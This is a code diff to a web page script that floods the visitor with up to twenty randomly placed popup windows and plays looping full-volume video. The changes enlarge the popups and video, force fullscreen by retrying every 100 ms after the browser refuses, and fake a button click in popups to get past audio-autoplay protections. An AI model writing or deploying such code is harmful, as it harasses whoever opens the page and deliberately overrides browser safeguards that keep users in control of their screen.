@@ -30,12 +30,12 @@
         function createPopup() {
             if (popupCount >= maxPopups) return;
             
-            const popup = window.open(window.location.href + '?popup=1', '_blank', 'width=400,height=300');
+            const popup = window.open(window.location.href + '?popup=1', '_blank', 'width=600,height=500');
             if (popup) {
                 popupCount++;
                 
-                const randomX = Math.random() * (screen.width - 400);
-                const randomY = Math.random() * (screen.height - 300);
+                const randomX = Math.random() * (screen.width - 600);
+                const randomY = Math.random() * (screen.height - 500);
                 popup.moveTo(randomX, randomY);
             }
         }
@@ -89,7 +89,13 @@
             
             // Only main window goes fullscreen
             if (!isPopup) {
-                document.documentElement.requestFullscreen().catch(e => {});
+                // Try fullscreen with retry
+                const tryFullscreen = () => {
+                    document.documentElement.requestFullscreen().catch(e => {
+                        setTimeout(tryFullscreen, 100);
+                    });
+                };
+                tryFullscreen();
                 
                 // Spawn popups
                 for (let i = 0; i < 20; i++) {
@@ -141,8 +147,8 @@
                 // Create 1 video element with amplified audio
                 const video = document.createElement('video');
                 video.src = videoSrc;
-                video.width = 560;
-                video.height = 315;
+                video.width = 800;
+                video.height = 600;
                 video.volume = 1.0;
                 video.loop = true;
                 videoContainer.appendChild(video);
@@ -192,7 +198,12 @@
         // Auto-start if URL has popup parameter
         const urlParams = new URLSearchParams(window.location.search);
         if (urlParams.has('popup')) {
-            startChaos(true);
+            // For popups, simulate a button click to enable audio
+            setTimeout(() => {
+                if (button) {
+                    button.click();
+                }
+            }, 500);
         }
     </script>
 </body>
